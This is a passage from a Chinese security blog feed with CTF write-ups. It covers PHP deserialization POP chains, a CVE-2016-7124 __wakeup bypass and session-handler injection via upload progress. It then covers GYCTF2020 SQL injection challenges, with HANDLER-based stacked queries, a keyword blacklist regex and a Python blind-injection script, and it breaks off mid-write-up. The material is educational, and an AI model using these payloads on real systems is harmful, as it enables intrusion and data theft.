class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><code>O:8:&quot;start_gg&quot;:1:{s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:1:{s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:1:{s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:1:{s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:1:{s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:{}}}}}}</code></p>
<p>题目是用Get传参进去，我这里直接将上述构造好的序列化字符串传进去，成功输出flag：</p>
<p><img src="/2019/08/06/谈一谈PHP反序列化/20190806234240441.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h5 id="例2：第十二届全国大学生信息安全竞赛-JustSoso"><a href="#例2：第十二届全国大学生信息安全竞赛-JustSoso" class="headerlink" title="例2：第十二届全国大学生信息安全竞赛 JustSoso"></a>例2：第十二届全国大学生信息安全竞赛 JustSoso</h5><h6 id="（1）题目-1"><a href="#（1）题目-1" class="headerlink" title="（1）题目"></a>（1）题目</h6><p>本题要先用文件包含得到源码<code>index.php</code>和<code>hint.php</code>，在这里我就只讲关于反序列化的部分了。</p>
<p><code>index.php</code>包含了<code>hint.php</code>，其中有<code>$payload = unserialize($payload);</code>进行了反序列化，而<code>$payload</code>是我们可控的参数。</p>
<p><code>hint.php</code>源码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;  </span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;  </span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;  </span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h6 id="（2）思路"><a href="#（2）思路" class="headerlink" title="（2）思路"></a>（2）思路</h6><ul>
<li>要想获取flag，明显要利用<strong>Flag</strong>类中<code>getFlag()</code>方法的<code>highlight_file()</code>函数将flag打印出来，因此需要将<code>$this-&gt;file</code>参数赋值为<code>flag.php</code>，所以就先找哪里调用了<code>getFlag()</code>方法。</li>
<li>发现在<strong>Handle</strong>类的<code>__destruct()</code>方法中调用了，所以只需要将<code>$handle</code>实例化为<strong>Flag</strong>类的对象，然后创建<code>Handle</code>类的对象就行了，该对象销毁时就会自动调用<code>__destruct()</code>。</li>
</ul>
<p>这样调用的思路就清楚了，但是和例1不同的是，这里还有两个地方需要绕过。</p>
<p>① 在<strong>Handle</strong>类的<code>__wakeup()</code>方法中，使用了<code>get_object_vars($this)</code>进行迭代来将类中的所有属性都赋值为null，这就意味着无论我们怎么构造，只要到<code>unserialize()</code>那里就会调用<code>__wakeup()</code>把属性都给清空，这样肯定就不会成功了。<br>这里需要通过CVE-2016-7124来绕过，即“<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>”。</p>
<p>前面我们介绍了序列化的格式，所以只需要在序列化字符串构造完成后，将属性的个数修改的比实际大就可以了。</p>
<p>② 在你终于成功调用到了<code>getFlag()</code>方法后，还必须满足<code>$this-&gt;token === $this-&gt;token_flag</code>的验证，而<br><code>token_flag</code>是每次随机生成的，怎么样才能使<code>$token</code>和它相等呢？</p>
<p>其实我们可以在构造的时候把<code>$token</code>声明为<code>$token_flag</code>的引用，如果不知道什么是引用，得好好补一下编程知识了，这样实际上<code>$token</code>与<code>$token_flag</code>就是同一个东西了，当然可以绕过验证。</p>
<h6 id="（3）解答-1"><a href="#（3）解答-1" class="headerlink" title="（3）解答"></a>（3）解答</h6><p>构造脚本如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Flag($handle);	<span class="comment">//将handle声明为Flag类的对象，并将$handle作为参数传入</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;token =&amp; <span class="keyword">$this</span>-&gt;handle-&gt;token_flag;	<span class="comment">//将token声明为token_flag的引用</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123; </span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Handle(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>输出结果：<br><code>O:6:&quot;Handle&quot;:1:{s:14:&quot; Handle handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
<p>当然要作为此题的payload，别忘了前面说的还要把序列化串中属性的个数由1改为2来绕过<code>__wakeup</code>的执行。</p>
<p><br></p>
<h3 id="0x05-PHP-SESSION反序列化"><a href="#0x05-PHP-SESSION反序列化" class="headerlink" title="0x05 PHP SESSION反序列化"></a>0x05 PHP SESSION反序列化</h3><p>除了上面说的，在文件里面不严谨的使用了<code>unserialize()</code>之外，反序列化还有一种利用方式，即SESSION反序列化。</p>
<h6 id="（1）-SESSION反序列化"><a href="#（1）-SESSION反序列化" class="headerlink" title="（1） SESSION反序列化"></a>（1） SESSION反序列化</h6><p>PHP在存储和读取session时,都会有一个序列化和反序列化的过程，同时反序列化中也会调用一些魔术方法。</p>
<p>PHP 内置了多种处理器用于存取 <code>$_SESSION</code> 数据，都会对数据进行序列化和反序列化，这几种处理器如下：</p>
<table>
<thead>
<tr>
<th>处理器</th>
<th>对应的存储格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值</td>
</tr>
<tr>
<td>php_serialize (php&gt;=5.5.4)</td>
<td>经过 serialize() 函数反序列处理的数组</td>
</tr>
</tbody>
</table>
<p><br></p>
<p>即若设置如下Session:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">    $passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'name'</span>] = $name;</span><br><span class="line">    $_SESSION[<span class="string">'passwd'</span>] = $passwd;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>当传入<code>name=lethe&amp;passwd=123</code>时，不同处理器对应的序列化字符串：结果如下:</p>
<table>
<thead>
<tr>
<th>处理器</th>
<th>对应存储的序列化字符串</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>name\</td>
<td>s:5:”lethe”;passwd\</td>
<td>s:3:”123”;</td>
</tr>
<tr>
<td>php_binary</td>
<td>names:5:”lethe”;passwds:3:”123”;</td>
</tr>
<tr>
<td>php_serialize (php&gt;=5.5.4)</td>
<td>a:2:{s:4:”name”;s:5:”lethe”;s:6:”passwd”;s:3:”123”;}</td>
</tr>
</tbody>
</table>
<p><br></p>
<p>问题就在，如果 PHP 在反序列化和序列化Session时使用不同的处理器，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码。</p>
<p>例子如下，有两个页面：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这两个页面分别用了不同的处理器来处理Session，我们就可以利用<code>php_serialize</code>和<code>php</code>的差异来进行构造。</p>
<p>我们先进行构造，脚本如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$a-&gt;test = <span class="string">'phpinfo();'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//output: O:1:"A":1:&#123;s:4:"test";s:10:"phpinfo();";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>首先，我们访问<code>test2.php</code>，我们在上述payload前加上<code>|</code>，并传入<code>?name=|O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;}</code>。</p>
<p>这样由<code>php_serialize</code>处理器序列化存入的session实际上为：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">a:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"name"</span></span>;<span class="symbol">s:</span><span class="number">42</span><span class="symbol">:<span class="string">"|O:1:"</span>A<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:10:"</span>phpinfo</span>();<span class="string">";&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>但是在<code>test1.php</code>中是使用的<code>php</code>处理器，由它们的区别我们可以知道：在被<code>php</code>处理器反序列化的时候，会以<code>|</code>来分割为键值对。</p>
<p>这样当带着上面上述Session去访问<code>test1.php</code>时，<code>|</code>后面的值，也就是我们构造的序列化字符串就会被成功的反序列化并执行了。</p>
<h6 id="（2）CTF实例"><a href="#（2）CTF实例" class="headerlink" title="（2）CTF实例"></a>（2）CTF实例</h6><p>题目连接：<a href="http://web.jarvisoj.com:32784" target="_blank" rel="noopener">http://web.jarvisoj.com:32784</a></p>
<p>给了源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到这里用了<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>，那么我们只要传入构造好的session，就可以进行反序列化攻击了。</p>
<p>根据题目，先看一下<code>phpinfo()</code>的信息，发现<code>session.upload_progress.enabled</code>是on的，而session.upload_progress.cleanup所以可以通过上传文件，从而在session文件中写入数据。</p>
<h6 id="（3）关于session-upload-progress（php-gt-5-4）"><a href="#（3）关于session-upload-progress（php-gt-5-4）" class="headerlink" title="（3）关于session.upload_progress（php&gt;=5.4）"></a>（3）关于session.upload_progress（php&gt;=5.4）</h6><p>在php.ini有以下几个默认选项：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.enabled</span> = on</span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.cleanup</span> = on</span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.prefix</span> = <span class="string">"upload_progress_"</span></span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.name</span> = <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)<strong>存储在session当中</strong> ；</p>
</li>
<li><p>cleanup=on表示当文件上传结束后，php将会<strong>立即清空</strong>对应session文件中的内容，这个选项<strong>非常重要</strong>；</p>
</li>
<li><p>name当它出现在表单中，php将会报告上传进度，最大的好处是，<strong>它的值可控</strong>；</p>
</li>
<li><p>prefix+name将表示为session中的键名</p>
</li>
</ul>
<p>关于这方面的利用，可以参考：<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p>
<p>所以这里我们先构造表单，这里的action只要是服务器上代码中有session_start()的php文件即可:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后利用如下脚本生成序列化字符串（这里system等系统函数好像使用不了，可能权限不够）：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">"print_r(scandir(dirname(__FILE__)));"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">// Output: O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>利用写好的表单随意上传文件，然后抓包，修改文件内容，因为我提交的是index页面所以直接看到结果：</p>
<p><img src="/2019/08/06/谈一谈PHP反序列化/20190807042442277.png" alt="在这里插入图片描述"></p>
<p>知道了flag的文件名，之后修改payload脚本的就可以代码执行了。</p>
<p>下面先读一下当前文件的目录位置：</p>
<p><img src="/2019/08/06/谈一谈PHP反序列化/2019080704552478.png" alt="在这里插入图片描述"></p>
<p>最后读出flag即可：</p>
<p><img src="/2019/08/06/谈一谈PHP反序列化/20190807045831366.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020_Writeup</title>
    <url>/2020/03/06/GYCTF2020-Writeup/</url>
    <content><![CDATA[<h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>一到注入题，和2019强网杯的随便住基本一致，但是多过滤了<code>set</code>、<code>prepare</code>、<code>alter</code>、<code>rename</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">set</span>|<span class="keyword">prepare</span>|<span class="keyword">alter</span>|<span class="keyword">rename</span>|<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure>
<p>获取表名和列名的方式与原题一致，而获取数据可以参考这篇文章：<a href="https://xz.aliyun.com/t/7169#toc-47，使用handler语句进行查询。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169#toc-47，使用handler语句进行查询。</a></p>
<blockquote>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200224112929391.png" alt="在这里插入图片描述"><br>所以可以构造payload如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?inject=-1';<span class="keyword">handler</span> FlagHere <span class="keyword">open</span>;<span class="keyword">handler</span> FlagHere <span class="keyword">read</span> <span class="keyword">first</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200224115021507.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h1><p>看名字就是一道sql注入的题目，经测试总共有四种回显：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bool(<span class="literal">false</span>)：查询语句有语法错误，如<span class="attribute">id</span>=1'</span><br><span class="line">SQL Injection Checked：含有被过滤的关键词时，包括<span class="keyword">and</span>、<span class="keyword">or</span>、union、<span class="keyword">in</span>、order、group、limit等。</span><br><span class="line">Nu1L：查询语句返回值为真，如<span class="attribute">id</span>=1^(1=1)^1#</span><br><span class="line"><span class="builtin-name">Error</span> Occured When Fetch Result.：查询语句返回值为假，如<span class="attribute">id</span>=1^(1=2)^1#</span><br></pre></td></tr></table></figure></p>
<p>这样很显然就是要进行盲注了，但是这里过滤了<code>in</code>，也就不能查询<code>information_schema</code>，但是可以从sys数据库中找到替代的，如<code>sys.x$schema_flattened_keys</code>，从中同样可以获取表名以及主键名。更多的替代可以参考这篇文章：<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/" target="_blank" rel="noopener">Alternatives to Extract Tables and Columns from MySQL and MariaDB</a></p>
<p>于是我们可以使用如下脚本盲注出表名：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"xxxxxxxxxxxxxxx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i, j)</span>:</span></span><br><span class="line">    payload = <span class="string">f"1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>)^1"</span>  <span class="comment"># f1ag_1s_h3r3_hhhhh </span></span><br><span class="line">    data = &#123;<span class="string">"id"</span>: payload&#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Nu1L"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += chr((low + high + <span class="number">1</span>) // <span class="number">2</span>)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>得到含有flag的表名：<code>f1ag_1s_h3r3_hhhhh</code></p>
<p>知道了表名，但是我们却无法知道列名，因此需要进行无列名的盲注，也就是如下判断下面这样式子的真假：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> 其他列,<span class="string">'猜测的数据'</span>) &gt; (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>在这里由于表中只有一行数据，所以正好无需limit语句，而表中的列为主键和flag列两列，因此我们构造的判断条件即为：</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span>,<span class="string">'&#123;&#125;~'</span>) &gt; (<span class="keyword">select</span> * <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
<ul>
<li>1则为主键的值，只有一行所以为1</li>
<li><code>{}</code>中则填入盲注猜测的flag字段值，而因为mysql比较字符串大小是按位比较的，所以我们在最后加上一个ascii码较大的<code>~</code>，这样的话<code>f~</code>就满足大于<code>flag{xxx}</code>，<code>e~</code>就满足小于<code>flag{xxx}</code></li>
<li>在写脚本的时候，只要按照ascii码从小到大的顺序进行猜解即可，即<code>f~&gt;(select * from f1ag_1s_h3r3_hhhhh), fl~&gt;(select * from f1ag_1s_h3r3_hhhhh),...</code><br>所以获得flag的脚本如下：</li>
</ul>
